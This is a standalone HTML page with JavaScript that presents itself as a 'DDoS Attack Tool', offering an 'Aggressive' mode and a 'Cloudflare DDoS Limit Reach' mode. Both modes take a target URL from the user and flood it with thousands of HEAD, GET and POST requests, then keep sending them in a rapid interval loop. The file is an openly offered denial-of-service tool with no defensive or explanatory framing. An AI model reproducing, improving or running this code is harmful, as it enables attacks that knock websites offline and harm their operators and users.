<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select DDoS Attack Tool</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #282c34;
            color: white;
            text-align: center;
            padding: 50px;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        input[type="radio"], button {
            padding: 10px;
            margin: 5px;
            font-size: 1em;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="radio"] {
            width: auto;
            height: auto;
            margin-right: 10px;
        }
        button {
            background: #61dafb;
            color: #282c34;
            transition: background 0.3s;
        }
        button:hover {
            background: #21a1f1;
        }
        #status {
            margin-top: 20px;
            font-size: 1.2em;
            color: red;
        }
        #console {
            margin-top: 20px;
            background: #333;
            padding: 10px;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>Select DDoS Attack Tool</h1>
    <p>
        <input type="radio" id="tool1" name="ddosTool" value="aggressive" checked>
        <label for="tool1">Aggressive DDoS Attack</label>
    </p>
    <p>
        <input type="radio" id="tool2" name="ddosTool" value="cloudflare">
        <label for="tool2">Cloudflare DDoS Limit Reach</label>
    </p>
    <button id="startButton" onclick="startSelectedAttack()">Start Attack</button>
    <div id="status"></div>
    <div id="console"></div>

    <script>
        let isAttacking = false;
        let attackInterval;

        function startSelectedAttack() {
            const selectedTool = document.querySelector('input[name="ddosTool"]:checked').value;
            const statusDiv = document.getElementById('status');
            const consoleDiv = document.getElementById('console');

            // Clear previous outputs
            statusDiv.innerText = '';
            consoleDiv.innerHTML = '';

            if (selectedTool === 'aggressive') {
                // Initialize and start the aggressive DDoS attack
                const targetURL = prompt("Enter the target URL for the Aggressive DDoS Attack:");
                if (targetURL) {
                    document.getElementById('status').innerText = 'Attack in progress...';
                    startAttackAggressive(targetURL);
                }
            } else if (selectedTool === 'cloudflare') {
                // Initialize and start the Cloudflare DDoS attack
                const targetURL = prompt("Enter the target URL for the Cloudflare DDoS Limit Reach:");
                if (targetURL) {
                    document.getElementById('status').innerText = 'Attack in progress...';
                    startAttackCloudflare(targetURL);
                }
            }
        }

        function startAttackAggressive(targetURL) {
            function sendRequest(method, path) {
                const xhr = new XMLHttpRequest();
                xhr.open(method, targetURL + path, true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
                    }
                };
                xhr.send();
            }

            const methods = ['HEAD', 'GET', 'POST'];
            const paths = ['/', '/index.html', '/api', '/randompath'];
            for (let i = 0; i < 2000; i++) {
                methods.forEach(method => {
                    paths.forEach(path => sendRequest(method, path));
                });
            }

            attackInterval = setInterval(() => {
                methods.forEach(method => {
                    paths.forEach(path => sendRequest(method, path));
                });
            }, 0);
        }

        function startAttackCloudflare(targetURL) {
            function sendRequest(method) {
                const xhr = new XMLHttpRequest();
                xhr.open(method, targetURL, true);
                xhr.withCredentials = true;
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
                    }
                };
                xhr.send();
            }

            const methods = ['HEAD', 'GET', 'POST'];
            for (let i = 0; i < 2000; i++) {
                methods.forEach(method => sendRequest(method));
            }

            attackInterval = setInterval(() => {
                methods.forEach(method => sendRequest(method));
            }, 100);
        }

        function stopAttack() {
            if (attackInterval) {
                clearInterval(attackInterval);
            }
            isAttacking = false;
            document.getElementById('startButton').innerText = 'Start Attack';
            document.getElementById('status').innerText = 'Attack stopped.';
        }

        function consoleOutput(message) {
            const consoleDiv = document.getElementById('console');
            const newMessage = document.createElement('div');
            newMessage.textContent = message;
            consoleDiv.appendChild(newMessage);
            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
        }

        document.getElementById('startButton').addEventListener('click', function() {
            if (isAttacking) {
                stopAttack();
            } else {
                startSelectedAttack();
            }
        });
    </script>
</body>
</html>
